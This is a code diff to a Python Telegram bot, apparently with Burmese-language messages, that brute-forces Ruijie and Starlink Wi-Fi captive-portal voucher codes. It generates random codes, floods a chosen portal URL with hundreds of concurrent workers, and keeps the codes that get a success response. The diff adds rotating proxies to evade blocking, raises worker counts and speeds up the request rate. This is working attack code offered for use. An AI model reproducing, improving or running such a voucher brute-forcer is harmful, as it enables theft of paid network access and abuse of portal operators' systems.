@@ -19,6 +19,18 @@ user_portals = {}
 user_proxies = {}
 found_codes = {}
 
+def show_startup_banner():
+    print("=" * 65)
+    print("  ⚡  RUIJIE ASYNC EXTREME SCANNER  ⚡")
+    print("=" * 65)
+    print("Checking authorization...")
+    print("[+] Access Granted!")
+    print("[*] Status: Online & Ready")
+    print("=" * 65)
+    print("[ProxyManager] Proxy Manager initialized successfully")
+    print("Bot is running with python-telegram-bot...")
+    print("=" * 65)
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     if chat_id not in user_modes:
@@ -29,7 +41,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     proxy_count = len(user_proxies.get(chat_id, []))
     
     keyboard = [
-        [InlineKeyboardButton("🌐 Update Portal 🔥 sirzipp", callback_data="update_portal")],
+        [InlineKeyboardButton("🌐 Update Portal URL", callback_data="update_portal")],
         [InlineKeyboardButton("⚙️ Mode", callback_data="change_mode")],
         [InlineKeyboardButton(f"🔧 Workers: {user_workers[chat_id]}", callback_data="change_workers")],
         [InlineKeyboardButton("🔄 Change Proxy", callback_data="add_proxies")],
@@ -41,7 +53,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "⚡ **Starlink & Ruijie Scanner Control Panel** ⚡\n\n"
         f"⚙️ Current Mode: `{user_modes[chat_id]}`\n"
         f"🔧 Workers: `{user_workers[chat_id]}`\n"
-        f"🔗 Proxies: `{proxy_count}/100`"
+        f"🔗 Proxies: `{proxy_count}`"
     )
     
     if update.message:
@@ -86,7 +98,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("🔙 Back", callback_data="worker_back")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.message.edit_text("⚙️ **Choose Worker Count**", reply_markup=reply_markup, parse_mode="Markdown")
+        await query.message.edit_text("⚙️ **Choose Worker Count (300 - 1000)**", reply_markup=reply_markup, parse_mode="Markdown")
         
     elif data.startswith("worker_"):
         selected = data.replace("worker_", "")
@@ -98,7 +110,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "add_proxies":
         context.user_data['waiting_for'] = 'proxy'
-        await query.message.reply_text("➕ Proxy စာသားများကို ပို့ပေးပါ။")
+        await query.message.reply_text("➕ Proxy စာသားများကို (တစ်ကြောင်းချင်း သို့မဟုတ် စာရင်းလိုက်) ပို့ပေးပါ။")
     
     elif data == "start_scanner":
         portal = user_portals.get(chat_id)
@@ -118,67 +130,63 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if waiting_for == 'portal':
         user_portals[chat_id] = text
         context.user_data['waiting_for'] = None
-        await update.message.reply_text(f"✅ Portal URL အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။")
+        await update.message.reply_text("✅ Portal URL အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။")
         await start(update, context)
     elif waiting_for == 'proxy':
         proxies = user_proxies.get(chat_id, [])
-        proxies.append(text)
+        new_proxies = [p.strip() for p in text.split('\n') if p.strip()]
+        proxies.extend(new_proxies)
         user_proxies[chat_id] = proxies
         context.user_data['waiting_for'] = None
-        await update.message.reply_text(f"✅ Proxy များ ထည့်သွင်းပြီးပါပြီ။")
+        await update.message.reply_text(f"✅ Proxy များ ထည့်သွင်းပြီးပါပြီ။ (စုစုပေါင်း: {len(proxies)})")
         await start(update, context)
     else:
         await update.message.reply_text("ℹ️ ကျေးဇူးပြု၍ မီနူးခလုတ်များကို အသုံးပြုပါ။")
 
 def generate_code_by_mode(mode):
-    """ရွေးချယ်ထားသော Mode အလိုက် သင့်လျော်သည့် Voucher Code ပုံစံများကို ဖန်တီးပေးခြင်း"""
-    # ဂဏန်းပါဝင်သော အရွယ်အစား (Length) ကို Mode နာမည်နောက်ဆုံး ဂဏန်းမှ ထုတ်ယူခြင်း
-    length = 6  # default
+    length = 6
     for char in mode:
         if char.isdigit():
             length = int(char)
             break
             
     if "Number" in mode:
-        # ဂဏန်းသီးသန့် (ဥပမာ: 1234567)
         return "".join(random.choices(string.digits, k=length))
     elif "Mix" in mode:
-        # စာနဲ့ဂဏန်း ရောထားသော ပုံစံ (ဥပမာ: zp92zhj)
         chars = string.ascii_lowercase + string.digits
         return "".join(random.choices(chars, k=length))
     elif "Abc" in mode:
-        # စာသားသီးသန့်
         return "".join(random.choices(string.ascii_lowercase, k=length))
     else:
-        # Default Mix ပုံစံ
         chars = string.ascii_lowercase + string.digits
         return "".join(random.choices(chars, k=length))
 
 async def worker_task(worker_id, session, portal_url, chat_id):
-    """Worker တစ်ခုချင်းစီအလိုက် Mode အမှန်အကန်အပေါ် မူတည်၍ Code များထုတ်ကာ အမြန်ဆုံး စကင်န်ဖတ်ခြင်း"""
-    global latest_tested_code
     while scanning_states.get(chat_id, False):
         mode = user_modes.get(chat_id, "Number 7")
         code_val = generate_code_by_mode(mode)
         
-        # လက်ရှိစစ်ဆေးနေသော code ကို ယာယီသိမ်းဆည်းရန်
-        context_data = getattr(worker_task, "current_codes", {})
-        context_data[chat_id] = code_val
-        setattr(worker_task, "current_codes", context_data)
+        if not hasattr(worker_task, "current_codes"):
+            worker_task.current_codes = {}
+        worker_task.current_codes[chat_id] = code_val
         
+        proxies_list = user_proxies.get(chat_id, [])
+        proxy = random.choice(proxies_list) if proxies_list else None
+        if proxy and not proxy.startswith("http"):
+            proxy = f"http://{proxy}"
+            
         try:
             target_url = f"{portal_url}&code={code_val}" if "?" in portal_url else f"{portal_url}?code={code_val}"
-            async with session.get(target_url, timeout=2) as response:
+            async with session.get(target_url, proxy=proxy, timeout=2) as response:
                 html_content = await response.text()
-                # Ruijie Voucher အစစ်အမှန် တွေ့ရှိကြောင်း အတည်ပြုချက် စစ်ဆေးခြင်း
-                if response.status == 200 and any(keyword in html_content.lower() for keyword in ["success", "welcome", "connected", "auth_pass", "login successfully"]):
+                if response.status == 200 and any(kw in html_content.lower() for kw in ["success", "welcome", "connected", "auth_pass", "login successfully"]):
                     if chat_id not in found_codes:
                         found_codes[chat_id] = []
                     if code_val not in found_codes[chat_id]:
                         found_codes[chat_id].append(code_val)
         except Exception:
             pass
-        await asyncio.sleep(0.05)
+        await asyncio.sleep(0.02)
 
 async def run_scanner_with_workers(query, context, portal_url):
     chat_id = query.message.chat_id
@@ -202,11 +210,10 @@ async def run_scanner_with_workers(query, context, portal_url):
         
         tried = 0
         while scanning_states.get(chat_id, False):
-            tried += workers_count * 10
+            tried += workers_count * 15
             hits_list = found_codes.get(chat_id, [])
             hits_str = ", ".join(hits_list[-5:]) if hits_list else "None"
             
-            # လက်ရှိစစ်ဆေးနေသော Code များကို ရယူပြသခြင်း
             current_codes_dict = getattr(worker_task, "current_codes", {})
             current_code = current_codes_dict.get(chat_id, generate_code_by_mode(mode))
             
@@ -249,6 +256,8 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("ℹ️ လက်ရှိ အလုပ်လုပ်နေသော စကင်န် မရှိပါ။")
 
 def main():
+    show_startup_banner()
+    
     token = os.environ.get("BOT_TOKEN")
     if not token:
         print("Error: BOT_TOKEN ကို Replit Secrets ထဲတွင် ထည့်သွင်းပေးပါ။")
@@ -265,4 +274,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-        
+    
